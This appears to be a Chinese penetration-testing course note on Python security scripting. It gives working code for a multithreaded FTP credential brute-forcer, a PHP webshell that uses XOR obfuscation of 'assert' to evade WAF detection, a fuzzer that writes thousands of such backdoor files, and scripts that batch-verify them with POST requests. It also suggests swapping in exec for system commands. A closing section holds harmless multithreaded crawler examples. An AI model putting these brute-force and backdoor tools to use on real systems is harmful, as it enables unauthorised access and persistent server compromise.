<a name="X3LCA"></a>
### 一、思维导图
![python安全.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1633073341439-e2381898-0897-4736-98d8-e5d95da16fb0.png#clientId=ubcc36c80-c110-4&from=paste&id=ua32cc1d6&originHeight=856&originWidth=1016&originalType=binary&ratio=1&size=88989&status=done&style=none&taskId=u3e648bf5-2e69-4b67-83ff-9e1ccfe60dd)<br /> #本课知识点： 协议模块使用，Request 爬虫技术，简易多线程技术，编码技术，Bypass 后门技术 #学习目的：  <br /> 掌握利用强大的模块实现各种协议连接操作(爆破或利用等)，配合 Fuzz 吊打 WAF 等  

<a name="I4zmg"></a>
### 二、演示案例

- Python 开发-简单多线程技术实现脚本
- Python 开发-利用 FTP 模块实现协议爆破脚本
- Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本
<a name="npwmR"></a>
#### 2、FTP暴力破解
```python
import ftplib
import threading
import queue
import sys

#利用Python开发其他协议爆破脚本
def ftp_check():
    while not q.empty():
        dict=q.get()
        dict=dict.split('|')
        username=dict[0]
        password=dict[1]
        ftp=ftplib.FTP()
        try:
            ftp.connect('192.168.0.101',21)
            ftp.login(username,password)
            ftp.retrlines('list')
            ftp.close()
            print('success|'+username+'|'+password)
        except ftplib.all_errors:
            print('failed|'+username+'|'+password)
            ftp.close()
            pass


if __name__ == '__main__':
    print("python ftp_burte.py user.txt pass.txt 10")
    user_file=sys.argv[1]
    pass_file = sys.argv[2]
    thread_x=sys.argv[3]
    q=queue.Queue()
    for username in open(user_file):
        for password in open(pass_file):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            diclist=username+'|'+password
            q.put(diclist)
    for x in range(int(thread_x)):
        t=threading.Thread(target=ftp_check)
        t.start()
```


<a name="ax8l1"></a>
#### 3、fuzz异或脚本shell
**原理：**`<?php $a =("!"^"@").'ssert';$a($_POST[x]); ?>`这个后门代码的意义是将ASCII的字符`"!"，"@"`通过异或运算(^)得到a，组成PHP中assert函数执行代码，由于运算复杂在waf中没有实现检查功能而从绕过waf。<br />下面的代码是通过python自动化生成异或运算，生成大量的后门文件。
```
for i in range(1, 127):
    for ii in range(1, 127):
        payload = "'" + chr(i) + "'" + '^' + "'" + chr(ii) + "'"
        code = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
        filename = str(i) + 'xd' + str(ii) + '.php'
        with open('D:/phpstudy/PHPTutorial/WWW/x/' + filename, 'a') as f:
            f.write(code)
            print('Fuzz->' + filename + '文件写入成功')
            f.close()
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1633074185022-08ea3b9a-e75c-417c-a0b9-a6d71ac07583.png#clientId=ubcc36c80-c110-4&from=paste&id=u45856334&originHeight=628&originWidth=1015&originalType=binary&ratio=1&size=78328&status=done&style=none&taskId=ue09b0d64-5bbd-4d87-9a3b-77e160eca1a)<br />访问地址`[http://127.0.0.1/x/33xd64.php](http://127.0.0.1/x/33xd64.php)`发送post数据`phpinfo();`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1633074455461-346d1f79-42b5-415c-a537-c93147978153.png#clientId=ubcc36c80-c110-4&from=paste&height=381&id=uf0945cb7&originHeight=761&originWidth=1914&originalType=binary&ratio=1&size=121481&status=done&style=none&taskId=uc1050bb9-13c4-4904-a020-a0c08bbe98e&width=957)<br />**用代码实验批量验证可以正常请求的后门文件**
```
import requests
import time
for i in range(1, 127):
    for ii in range(1, 127):
        payload = "'" + chr(i) + "'" + '^' + "'" + chr(ii) + "'"
        code = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
        filename = str(i) + 'xd' + str(ii) + '.php'
        url = 'http://127.0.0.1/x/' + filename
        datas = {
            'x': 'phpinfo();'
        }
        result = requests.post(url, data=datas).content.decode('utf-8')
        if 'Windows' in result:
            print('check->' + filename + '->ok')
        else:
            print('check->' + filename + '->no')
        time.sleep(1)


```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1633075461794-4c7a4495-7089-4a7f-9786-5a0ba2607960.png#clientId=ubcc36c80-c110-4&from=paste&height=92&id=u989aa7d3&originHeight=183&originWidth=1060&originalType=binary&ratio=1&size=21462&status=done&style=none&taskId=uaf6130be-1f7e-4e74-bb88-79e2c4948ee&width=530)<br />**引入多线程**
```python
import requests
import time
import threading, queue


def string():
    while not q.empty():
        filename = q.get()
        url = 'http://127.0.0.1/x/' + filename
        datas = {
            'x': 'phpinfo();'
        }
        result = requests.post(url, data=datas).content.decode('utf-8')
        if 'DESKTOP-1O25JJN' in result:
            print('check->' + filename + '->ok')
        else:
            # print('check->'+filename+'->no')
            pass
        time.sleep(1)


def shell_test_check():
    url = 'http://127.0.0.1/x/33xd64.php'
    datas = {
        'x': 'phpinfo();'
    }
    result = requests.post(url, data=datas).content.decode('utf-8')
    print(result)
    if 'XIAODI-PC' in result:
        print('ok')


if __name__ == '__main__':
    q = queue.Queue()
    for i in range(33, 127):
        for ii in range(33, 127):
            payload = "'" + chr(i) + "'" + '^' + "'" + chr(ii) + "'"
            code = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>"
            filename = str(i) + 'xd' + str(ii) + '.php'
            q.put(filename)
            with open('D:/phpstudy/PHPTutorial/WWW/x/' + filename, 'a') as f:
                f.write(code)
                f.close()
                print('Fuzz文件生成成功')
    for x in range(20):
        t = threading.Thread(target=string)
        t.start()

```
当然这个代码是可以继续优化的比如将访问成功的后门单独保存,当然这个代码还可以升级例如将`assert`函数换为`$e $t` ，另外还可以替换assert函数换为`exec`等PHP中可以调用的系统函数。
<a name="bIRS3"></a>
### 三、补充多线程知识
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1633077844209-2d24672e-5d6e-45bf-86cf-593a9d6d93fb.png#clientId=u7b7aa894-0ec1-4&from=paste&height=362&id=u73393e19&originHeight=723&originWidth=1340&originalType=binary&ratio=1&size=216256&status=done&style=none&taskId=u63b4b765-b662-48c6-bae2-23a68d20670&width=670)
```python
import requests
urls = [f"https://www.cnblogs.com/#p{page}"
        for page in range(51)
        ]

def craw(url):
    r = requests.get(url)
    print(url,len(r.text))

craw(urls[0])
```
```python
import threading
import time
import blog_spider

def single_thread():
    print("single_thread begin")
    for url in blog_spider.urls:
        blog_spider.craw(url)
    print("single_thread end")


def multi_thread():
    print("multi_thread begin")
    threads = []
    for url in blog_spider.urls:
        threads.append(
            threading.Thread(target=blog_spider.craw,args=(url,))
        )
    for thread in threads:
        thread.start()

    for thread in threads():
        thread.join()

    print("muliti_thread end")

if __name__ == '__main__':
    start = time.time()
    single_thread()
    end = time.time()
    print("single thread cost:", end - start, "seconds")

    start = time.time()
    multi_thread()
    end = time.time()
    print("multi_thread cost:", end - start,  "seconds")
```
